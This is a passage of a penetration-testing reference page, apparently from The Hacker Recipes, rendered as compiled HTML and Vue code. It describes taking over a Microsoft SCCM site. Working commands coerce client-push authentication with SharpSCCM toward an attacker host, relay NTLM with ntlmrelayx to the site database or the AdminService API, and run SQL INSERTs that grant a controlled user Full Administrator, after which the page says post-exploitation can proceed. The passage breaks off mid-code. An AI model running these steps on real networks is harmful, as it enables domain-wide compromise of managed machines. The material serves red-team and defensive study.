<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">SharpSCCM.exe</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> invoke client</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">push </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">t  </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">--as-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">admin</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># If not MP admin</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">SharpSCCM.exe</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> invoke client</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">push </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">t</span></span></code></pre></div><h5 id="step-3-cleanup" tabindex="-1">Step 3: cleanup <a class="header-anchor" href="#step-3-cleanup" aria-label="Permalink to &quot;Step 3: cleanup&quot;">​</a></h5><p>If you run the above SharpSCCM command with the <code>--as-admin</code> parameter (since you have admin privileges over the MP), there&#39;s nothing to do. Otherwise, get in contact with the administrator of the SCCM system you just messed up and provide the name or IP of the attacker server you provided in the <code>-t </code> parameter. This is the device name that will appear in SCCM.</p><h3 id="sccm-site-takeover" tabindex="-1">SCCM Site Takeover <a class="header-anchor" href="#sccm-site-takeover" aria-label="Permalink to &quot;SCCM Site Takeover&quot;">​</a></h3><p>The primary site server&#39;s computer account is member of the local Administrators group on the site database server and on every site server hosting the &quot;SMS Provider&quot; role in the hierarchy (See <a href="./index#topology">SCCM Topology</a>).</p><blockquote><p>The user account that installs the site must have the following permissions:</p><ul><li>Administrator on the following servers:</li><li>The site server</li><li>Each SQL Server that hosts the site database</li><li>Each instance of the SMS Provider for the site</li><li>Sysadmin on the instance of SQL Server that hosts the site database</li></ul><p><em>(source:</em> <a href="https://learn.microsoft.com/en-us/mem/configmgr/core/servers/deploy/install/prerequisites-for-installing-sites" target="_blank" rel="noreferrer"><em>Microsoft.com</em></a><em>)</em></p></blockquote><p>This means that it is possible to obtain administrative access on the site database server, or interact as a local administrator with the HTTP API on the SMS Provider, by relaying a NTLM authentication coming from the primary site server, for example by coercing an automatic client push installation from it, and granting full access on the SCCM site to a controlled user.</p><div class="tip custom-block"><p>For more details about how these attacks work, refer to the article &quot;<a href="https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1" target="_blank" rel="noreferrer">SCCM Site Takeover via Automatic Client Push Installation</a>&quot; by <a href="https://mobile.twitter.com/_mayyhem" target="_blank" rel="noreferrer">Chris Thompson</a> for the database attack, and &quot;<a href="https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf" target="_blank" rel="noreferrer">Site Takeover via SCCM’s AdminService API</a>&quot; by <a href="https://twitter.com/garrfoster" target="_blank" rel="noreferrer">Garrett Foster</a> for the HTTP one.</p></div><h4 id="relay-to-the-mssql-site-database" tabindex="-1">Relay to the MSSQL site database <a class="header-anchor" href="#relay-to-the-mssql-site-database" aria-label="Permalink to &quot;Relay to the MSSQL site database&quot;">​</a></h4><div class="caution custom-block"><p>Some requirements are needed to perform the attack:</p><ul><li><p>automatic site assignment and automatic site-wide <a href="./index#client-push-installation-1">client push installation</a> are enabled</p></li><li><p>fallback to NTLM authentication is enabled (default)</p></li><li><p>the hotfix <a href="https://learn.microsoft.com/fr-fr/mem/configmgr/hotfix/2207/15599094" target="_blank" rel="noreferrer">KB15599094</a> not installed (it prevents the client push installation account to perform an NTLM connection to a client)</p></li><li><p>PKI certificates are not required for client authentication (default)</p></li><li><p>either:</p></li><li><p>MSSQL is reachable on the site database server</p></li></ul><p>OR</p><ul><li>SMB is reachable and SMB signing isn’t required on the site database server</li><li>knowing the three-character site code for the SCCM site is required (step 3 below)</li><li>knowing the NetBIOS name, FQDN, or IP address of a site management point is required</li><li>knowing the NetBIOS name, FQDN, or IP address of the site database server is required</li></ul><p>The first four requirements above apply to the <a href="./index#client-push-installation">client push installation coercion technique</a>. But without them, a regular coercion technique could still be used (petitpotam, printerbug, etc.).</p></div><h5 id="step-1-retrieve-the-controlled-user-sid" tabindex="-1">Step 1: retrieve the controlled user SID <a class="header-anchor" href="#step-1-retrieve-the-controlled-user-sid" aria-label="Permalink to &quot;Step 1: retrieve the controlled user SID&quot;">​</a></h5><p>The first step consists in retrieving the hexadecimal format of the user&#39;s SID (Security IDentifier) to grant &quot;Full Administrator SCCM role&quot; to, on the site database server. The hex formatted SID is needed in a part below: <a href="./index#4.-obtain-an-sql-console">#4.-obtain-an-sql-console</a>.</p>`,25)),t(l,null,{default:a(()=>[t(n,{label:"UNIX-like"},{default:a(()=>i[6]||(i[6]=[e("p",null,[s("From UNIX-like systems, the Samba utility named "),e("a",{href:"https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html",target:"_blank",rel:"noreferrer"},"rpcclient"),s(" can be used for this purpose.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"rpcclient"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -c"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "lookupnames USER"'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $TARGET_IP")])])])],-1),e("p",null,[s("Impacket's "),e("a",{href:"https://github.com/fortra/impacket/blob/master/examples/lookupsid.py",target:"_blank",rel:"noreferrer"},"lookupsid"),s(" (Python) can also be used to retrieve the user's SID.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"lookupsid.py"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"/"'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USERNAME"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'":"'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"@"'),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$TARGET_IP_OR_NAME"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')])])])],-1),e("p",null,[s("The returned SID value is in canonical format and not hexadecimal, "),e("a",{href:"https://github.com/fortra/impacket/blob/34229464dab9ed4e432fdde56d14a916baaac4db/impacket/ldap/ldaptypes.py#L48",target:"_blank",rel:"noreferrer"},"impacket"),s(" can be used to convert it as follows.")],-1),e("div",{class:"language-python vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"python"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"from"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," impacket.ldap "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"import"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," ldaptypes")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"sid"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"="),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ldaptypes.LDAP_SID()")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"sid.fromCanonical("),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'sid_value'"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},")")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"print"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"("),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'0x'"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," +"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," ''"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},".join("),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"{"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},":02X"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"}"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"'"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},".format(b) "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"for"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," b "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"in"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," sid.getData()))")])])])],-1)])),_:1}),t(n,{label:"Windows"},{default:a(()=>i[7]||(i[7]=[e("p",null,[s("From Windows systems, "),e("a",{href:"https://github.com/Mayyhem/SharpSCCM",target:"_blank",rel:"noreferrer"},"SharpSCCM"),s(" (C#) can be used for this purpose.")],-1),e("div",{class:"language- vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"}),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",null,"# this should be run on the windows SCCM client as the user (no need for admin privileges here)")]),s(`
`),e("span",{class:"line"},[e("span",null,"SharpSCCM.exe get user-sid")])])])],-1)])),_:1})]),_:1}),i[24]||(i[24]=e("h5",{id:"step-2-setup-ntlm-relay-server",tabindex:"-1"},[s("Step 2: setup NTLM relay server "),e("a",{class:"header-anchor",href:"#step-2-setup-ntlm-relay-server","aria-label":'Permalink to "Step 2: setup NTLM relay server"'},"​")],-1)),i[25]||(i[25]=e("p",null,[s("The target of the "),e("a",{href:"./../ntlm/relay"},"NTLM relay attack"),s(" must be set to the site database server, either on the MS-SQL (port "),e("code",null,"1433/tcp"),s("), or SMB service (port "),e("code",null,"445/tcp"),s(") if the relayed user has admin privileges on the target. The rest of this page is focusing on relaying the authentication on the MS-SQL service.")],-1)),t(l,null,{default:a(()=>[t(n,{label:"UNIX-like"},{default:a(()=>i[8]||(i[8]=[e("p",null,[s("From UNIX-like systems, "),e("a",{href:"https://github.com/fortra/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),s("'s "),e("a",{href:"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",target:"_blank",rel:"noreferrer"},"ntlmrelayx.py"),s(" (Python) script can be used for that purpose. In the examples below, the "),e("code",null,"-socks"),s(" option is used for more versatility but is not required.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# targetting MS-SQL")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ntlmrelayx.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -t"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "mssql://siteDatabase.domain.local"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -smb2support"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -socks")]),s(`
`),e("span",{class:"line"}),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# targeting SMB")]),s(`
`),e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ntlmrelayx.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -t"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "siteDatabase.domain.local"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -smb2support"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -socks")])])])],-1)])),_:1}),t(n,{label:"Windows"},{default:a(()=>i[9]||(i[9]=[e("p",null,[s("From Windows systems, "),e("a",{href:"https://github.com/Kevin-Robertson/Inveigh",target:"_blank",rel:"noreferrer"},"Inveigh-Relay"),s(" (Powershell) can be used as an alternative to "),e("a",{href:"https://github.com/fortra/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),s("'s "),e("a",{href:"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",target:"_blank",rel:"noreferrer"},"ntlmrelayx.py"),s(", however it doesn't feature the same SOCKS functionality, need in the steps detailed below, meaning the exploitation from Windows system will need to be adapted.")],-1)])),_:1})]),_:1}),i[26]||(i[26]=r('<p>Fore more insight on NTLM relay attacks and tools options, see the corresponding page on The Hacker Recipes: <a href="./../ntlm/relay">NTLM Relay</a>.</p><ol start="3"><li>Authentication coercion</li></ol><p>The primary site server&#39;s authentication can be coerced via automatic client push installation targeting the relay server with <a href="https://github.com/Mayyhem/SharpSCCM" target="_blank" rel="noreferrer">SharpSCCM</a> (C#). For more information, see the corresponding article &quot;<a href="https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a" target="_blank" rel="noreferrer">Coercing NTLM authentication from SCCM</a>&quot; by <a href="https://mobile.twitter.com/_mayyhem" target="_blank" rel="noreferrer">Chris Thompson</a>. Alternatively, the server&#39;s authentication could be coerced with other, more common, coercion techniques (<a href="./../print-spooler-service/printerbug">PrinterBug</a>, <a href="./../mitm-and-coerced-authentications/ms-efsr">PetitPotam</a>, <a href="./../mitm-and-coerced-authentications/ms-fsrvp">ShadowCoerce</a>, <a href="./../mitm-and-coerced-authentications/ms-dfsnm">DFSCoerce</a>, etc.).</p>',3)),t(l,null,{default:a(()=>[t(n,{label:"UNIX-like"},{default:a(()=>i[10]||(i[10]=[e("p",null,[s("From UNIX-like systems, authentication can be coerced through "),e("a",{href:"./../print-spooler-service/printerbug"},"PrinterBug"),s(", "),e("a",{href:"./../mitm-and-coerced-authentications/ms-efsr"},"PetitPotam"),s(", "),e("a",{href:"./../mitm-and-coerced-authentications/ms-fsrvp"},"ShadowCoerce"),s(", "),e("a",{href:"./../mitm-and-coerced-authentications/ms-dfsnm"},"DFSCoerce"),s(", etc. (not based on triggering the client push installation).")],-1),e("p",null,[s("There isn't any UNIX-like alternative to the "),e("code",null,"SharpSCCM.exe invoke client-push"),s(" feature (yet).")],-1)])),_:1}),t(n,{label:"Windows"},{default:a(()=>i[11]||(i[11]=[e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SharpSCCM.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," invoke client"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"push "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"mp "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"SCCM-Server"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"sc "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'""'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"t "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"attacker.domain.local"')])])])],-1)])),_:1})]),_:1}),i[27]||(i[27]=r(`<p>The rest of this page is focusing on relaying the authentication on the MS-SQL service.</p><ol start="4"><li>Obtain an SQL console</li></ol><p>If the NTLM relay attack is a success and was targeting the MS-SQL service with SOCKS support, an SQL console could be obtained on the SCCM database through the opened socks proxy. From UNIX-like systems, <a href="https://github.com/fortra/impacket" target="_blank" rel="noreferrer">Impacket</a>&#39;s <a href="https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py" target="_blank" rel="noreferrer">mssqlclient</a> (Python) can be used for that purpose.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">proxychains</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mssqlclient.py</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;DOMAIN/SCCM-Server$&quot;@&quot;siteDatabase.domain.local&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -windows-auth</span></span></code></pre></div><p>Once the console is obtained, the attack can proceed to granting the user full privileges by running the following commands in the SQL console.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>--Switch to site database</span></span>
<span class="line"><span>use CM_&lt;site_code&gt;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>--Add the SID, the name of the current user, and the site code to the RBAC_Admins table</span></span>
<span class="line"><span>INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (&lt;SID_in_hex_format&gt;,&#39;DOMAIN\\user&#39;,0,0,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&lt;site_code&gt;&#39;);</span></span>
<span class="line"><span></span></span>
<span class="line"><span>--Retrieve the AdminID of the added user</span></span>
<span class="line"><span>SELECT AdminID,LogonName FROM RBAC_Admins;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>--Add records to the RBAC_ExtendedPermissions table granting the AdminID the Full Administrator (SMS0001R) RoleID for the “All Objects” scope (SMS00ALL), </span></span>
<span class="line"><span>--the “All Systems” scope (SMS00001), </span></span>
<span class="line"><span>--and the “All Users and User Groups” scope (SMS00004)</span></span>
<span class="line"><span>INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (&lt;AdminID&gt;,&#39;SMS0001R&#39;,&#39;SMS00ALL&#39;,&#39;29&#39;);</span></span>
<span class="line"><span>INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (&lt;AdminID&gt;,&#39;SMS0001R&#39;,&#39;SMS00001&#39;,&#39;1&#39;);</span></span>
<span class="line"><span>INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (&lt;AdminID&gt;,&#39;SMS0001R&#39;,&#39;SMS00004&#39;,&#39;1&#39;);</span></span></code></pre></div><p>It is then possible to verify the new privileges on SCCM.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span># this should be run on the windows SCCM client as the user that was just given full administrative role to </span></span>
<span class="line"><span>.\\SharpSCCM.exe get site-push-settings -mp &quot;SCCM-Server&quot; -sc &quot;&lt;site_code&gt;&quot;</span></span></code></pre></div><p>Post exploitation via SCCM can now be performed on the network.</p><h4 id="relay-to-the-http-api-adminservice" tabindex="-1">Relay to the HTTP API AdminService <a class="header-anchor" href="#relay-to-the-http-api-adminservice" aria-label="Permalink to &quot;Relay to the HTTP API AdminService&quot;">​</a></h4><div class="caution custom-block"><p>Some requirements are needed to perform the attack:</p><ul><li>The HTTP API for the AdminService service is reachable on the SMS Provider server</li><li>knowing the NetBIOS name, FQDN, or IP address of a site management point is required</li><li>knowing the NetBIOS name, FQDN, or IP address of the site SMS provider server is required</li></ul></div><h5 id="step-1-setup-an-ntlm-relay-server" tabindex="-1">Step 1: setup an NTLM relay server <a class="header-anchor" href="#step-1-setup-an-ntlm-relay-server" aria-label="Permalink to &quot;Step 1: setup an NTLM relay server&quot;">​</a></h5><p>The target of the <a href="./../ntlm/relay">NTLM relay attack</a> must be set to the SMS Provider server, on the HTTP/S service (port <code>80/tcp</code> or <code>443/tcp</code>).</p>`,13)),t(l,null,{default:a(()=>[t(n,{label:"UNIX-like"},{default:a(()=>i[12]||(i[12]=[e("p",null,[s("From UNIX-like systems, "),e("a",{href:"https://github.com/fortra/impacket/pull/1593",target:"_blank",rel:"noreferrer"},"this PR"),s(" on "),e("a",{href:"https://github.com/fortra/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),s("'s "),e("a",{href:"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",target:"_blank",rel:"noreferrer"},"ntlmrelayx.py"),s(" (Python) script can be used for that purpose.")],-1),e("div",{class:"language-bash vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"bash"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"ntlmrelayx.py"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -t"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," https://smsprovider.domain.local/AdminService/wmi/SMS_Admin"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -smb2support"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --adminservice"),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --logonname"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "DOMAIN\\USER"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --displayname"),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "DOMAIN\\USER"'),e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --objectsid")])])])],-1)])),_:1}),t(n,{label:"Windows"},{default:a(()=>i[13]||(i[13]=[e("p",null,[s("From Windows systems, "),e("a",{href:"https://github.com/Kevin-Robertson/Inveigh",target:"_blank",rel:"noreferrer"},"Inveigh-Relay"),s(" (Powershell) can be used as an alternative to "),e("a",{href:"https://github.com/fortra/impacket",target:"_blank",rel:"noreferrer"},"Impacket"),s("'s "),e("a",{href:"https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py",target:"_blank",rel:"noreferrer"},"ntlmrelayx.py"),s(", however it doesn't feature the same functionalities regarding this specific target, need in the steps detailed below, meaning the exploitation from Windows system will need to be adapted.")],-1)])),_:1})]),_:1}),i[28]||(i[28]=r('<p>Fore more insight on NTLM relay attacks and tools options, see the corresponding page on The Hacker Recipes: <a href="./../ntlm/relay">NTLM Relay</a>.</p><h5 id="step-2-authentication-coercion" tabindex="-1">Step 2: authentication coercion <a class="header-anchor" href="#step-2-authentication-coercion" aria-label="Permalink to &quot;Step 2: authentication coercion&quot;">​</a></h5><p>The primary site server&#39;s authentication can be coerced via automatic client push installation targeting the relay server with <a href="https://github.com/Mayyhem/SharpSCCM" target="_blank" rel="noreferrer">SharpSCCM</a> (C#). For more information, see the corresponding article &quot;<a href="https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a" target="_blank" rel="noreferrer">Coercing NTLM authentication from SCCM</a>&quot; by <a href="https://mobile.twitter.com/_mayyhem" target="_blank" rel="noreferrer">Chris Thompson</a>. Alternatively, the server&#39;s authentication could be coerced with other, more common, coercion techniques (<a href="./../print-spooler-service/printerbug">PrinterBug</a>, <a href="./../mitm-and-coerced-authentications/ms-efsr">PetitPotam</a>, <a href="./../mitm-and-coerced-authentications/ms-fsrvp">ShadowCoerce</a>, <a href="./../mitm-and-coerced-authentications/ms-dfsnm">DFSCoerce</a>, etc.).</p>',3)),t(l,null,{default:a(()=>[t(n,{label:"UNIX-like"},{default:a(()=>i[14]||(i[14]=[e("p",null,[s("From UNIX-like systems, authentication can be coerced through "),e("a",{href:"./../print-spooler-service/printerbug"},"PrinterBug"),s(", "),e("a",{href:"./../mitm-and-coerced-authentications/ms-efsr"},"PetitPotam"),s(", "),e("a",{href:"./../mitm-and-coerced-authentications/ms-fsrvp"},"ShadowCoerce"),s(", "),e("a",{href:"./../mitm-and-coerced-authentications/ms-dfsnm"},"DFSCoerce"),s(", etc. (not based on triggering the client push installation).")],-1),e("p",null,[s("There isn't any UNIX-like alternative to the "),e("code",null,"SharpSCCM.exe invoke client-push"),s(" feature (yet).")],-1)])),_:1}),t(n,{label:"Windows"},{default:a(()=>i[15]||(i[15]=[e("div",{class:"language-powershell vp-adaptive-theme"},[e("button",{title:"Copy Code",class:"copy"}),e("span",{class:"lang"},"powershell"),e("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[e("code",null,[e("span",{class:"line"},[e("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"SharpSCCM.exe"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," invoke client"),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"push "),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"-"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"mp "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"SCCM-Server"'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"sc "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'""'),e("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),e("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"t "),e("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"attacker.domain.local"')])])])],-1)])),_:1})]),_:1}),i[29]||(i[29]=r(`<p>If the NTLM relay attack is a success and ntlmrelayx.py has effectively sent the request to the sms provider server, the controlled should be now a SCCM site admin.</p><p>It is then possible to verify the new privileges on SCCM.</p><div class="language-powershell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># this should be run on the windows SCCM client as the user that was just given full administrative role to </span></span>
